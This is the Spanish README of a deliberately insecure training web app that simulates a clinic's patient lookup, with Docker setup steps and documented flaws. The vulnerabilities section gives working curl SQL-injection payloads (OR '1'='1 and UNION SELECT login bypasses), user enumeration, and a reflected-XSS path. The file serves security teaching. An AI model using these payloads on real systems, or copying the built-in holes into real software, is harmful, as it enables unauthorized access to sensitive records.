# Insecure Patient Lookup

Esta aplicación está creada para ser deliberadamente explotable e insegura, con el fin de demostrar diferentes vulnerabilidades que podrían afectar a aplicaciones web y sistemas mal escritos.

El caso que se examinará en este repositorio es el de una clínica que utiliza esta aplicación de Node como interfaz para su base de datos (consulta el CSV para ver un registro en texto plano). La aplicación puede buscar información de pacientes y mostrarla, algo sencillo. Las siguientes vulnerabilidades están presentes en esta aplicación:

- XSS
- SQLi
- Falta de SSL / sin HTTPS
- Cookies de login débiles y almacenadas en texto plano
- Autenticación débil por contraseña, sin MFA ni limitación de intentos (rate-limiting) en el servidor

## Ejecución con Docker

El proyecto incluye un `docker-compose.yml` con dos servicios: `app` (el servidor de desarrollo de Vite/Hono en el puerto `8080`) y `db` (MariaDB 11 con los datos persistidos en un volumen). No hace falta instalar Node ni MariaDB en el equipo anfitrión.

> **Requisito:** Docker con el plugin Compose.

### 1. Construir y levantar los contenedores

```bash
docker compose up --build -d
```

La base de datos se inicializa automáticamente la primera vez que arranca:

- `veryBadDatabase.sql` crea la base `lab` y las tablas `historiales_clinicos`, `Users` y `Passwords`.
- `docker/init/01-demo-users.sql` inserta el usuario de prueba documentado más abajo.

El servicio `app` espera a que `db` esté saludable antes de iniciar. La aplicación queda disponible en <http://localhost:8080>.

### 2. Cargar los registros de pacientes (CSV)

El esquema arranca sin pacientes; las 2000 filas de `BD_Historiales_Clinicos_2000.csv` se cargan con el servicio `seed`, que ejecuta `migration.js` contra la base de datos del contenedor:

```bash
docker compose --profile seed run --rm seed
```

Salida esperada al final: `Migrated 2000 patients into lab.historiales_clinicos`. El servicio `seed` no es idempotente (falla si se ejecuta dos veces por claves primarias duplicadas).

### 3. Ingresar a la aplicación

Abre <http://localhost:8080/login> e inicia sesión con:

| Campo | Valor |
| --- | --- |
| Número de empleado (`uid`) | `1` |
| Contraseña | `admin` |

Los ejemplos de `curl` de la sección de vulnerabilidades usan el puerto `5173` porque se probaron con el servidor local (`pnpm dev`); con Docker basta cambiar el puerto a `8080`.

### 4. Comandos útiles

```bash
docker compose ps                                # estado de los servicios
docker compose logs -f app                       # logs del servidor de desarrollo
docker compose exec db mariadb -ulab -plab lab   # consola SQL
docker compose down                              # detener y eliminar los contenedores (conserva los datos)
docker compose down -v                           # detener y borrar el volumen de la base de datos
```

Tras `down -v`, el siguiente `up` vuelve a ejecutar los scripts de inicialización; recuerda correr también el paso 2 para recargar el CSV.

### Variables de entorno

La aplicación lee la conexión a la base de datos desde el entorno (`src/index.tsx:13-17`). Los valores del `docker-compose.yml` son:

| Variable | Valor | Descripción |
| --- | --- | --- |
| `DB_HOST` | `db` | Nombre del servicio de MariaDB |
| `DB_PORT` | `3306` | Puerto de MariaDB |
| `DB_USER` | `lab` | Usuario creado por la imagen de MariaDB |
| `DB_PASSWORD` | `lab` | Contraseña del usuario `lab` |
| `DB_NAME` | `lab` | Nombre de la base de datos |

Para cambiarlos, edita el bloque `environment` de los servicios `app` y `seed` (y las variables `MARIADB_*` del servicio `db`) en `docker-compose.yml`. Los datos solo se inicializan cuando el volumen está vacío: si cambias las credenciales o el esquema, usa `docker compose down -v` antes de volver a levantar.

## Vulnerabilidades documentadas

### Inyección SQL en `/api/login` (bypass de autenticación)

La ruta `POST /api/login` construye la consulta concatenando el valor de `uid` directamente en el SQL (sin consultas parametrizadas). Además, la aplicación devuelve mensajes distintos según el usuario exista o no, lo que permite enumerar cuentas válidas. Los siguientes ejemplos fueron probados y verificados contra la aplicación en ejecución (`localhost:5173`), con el usuario de prueba `uid=1 / admin / admin` (almacenado en texto plano, por cierto).

**1. Login correcto**

```bash
curl -i -X POST http://localhost:5173/api/login \
  -H 'Content-Type: application/json' \
  -d '{"uid":"1","pwd":"admin"}'
```

Respuesta esperada: `200 {"auth":true,"message":"Login exitoso","user":{"uid":1,"name":"admin"}}` y las cookies `auth=true` y `uid=1` (sin `HttpOnly`, `Secure` ni expiración).

**2. Enumeración de usuarios**

```bash
curl -i -X POST http://localhost:5173/api/login \
  -H 'Content-Type: application/json' \
  -d '{"uid":"999","pwd":"x"}'
```

Respuesta esperada: `404 {"auth":false,"message":"Usuario 999 no encontrado"}`. El mensaje distinto a "Contraseña incorrecta" confirma qué `uid` existen.

**3. Bypass con `OR` (login como el primer usuario de la tabla)**

```bash
curl -X POST http://localhost:5173/api/login \
  -H 'Content-Type: application/json' \
  -d @- <<'EOF'
{"uid":"1' OR '1'='1","pwd":"admin"}
EOF
```

La consulta resultante es `WHERE u.uid = '1' OR '1'='1'`, que devuelve todos los usuarios; como la app se queda con el primero, basta conocer su contraseña (por ejemplo `admin`) para entrar.

**4. Bypass con `UNION SELECT` (identidad fabricada, sin conocer ninguna contraseña)**

```bash
curl -X POST http://localhost:5173/api/login \
  -H 'Content-Type: application/json' \
  -d @- <<'EOF'
{"uid":"' UNION SELECT 99, 'root', 'owned' -- ","pwd":"owned"}
EOF
```

Repuesta esperada: `200 {"auth":true,"message":"Login exitoso","user":{"uid":99,"name":"root"}}` — se autentica contra una fila que no existe en la base de datos. Nota: el `-- ` debe llevar un espacio al final para que el apóstrofo que cierra la consulta quede comentado.

Las mismas inyecciones funcionan enviando el formulario de la página `/login` directamente (la ruta también acepta `application/x-www-form-urlencoded`); la única diferencia es que el fallo re-renderiza la página con el mensaje de error insertado con `dangerouslySetInnerHTML`, lo que convierte el campo `uid` en un vector XSS reflejado.
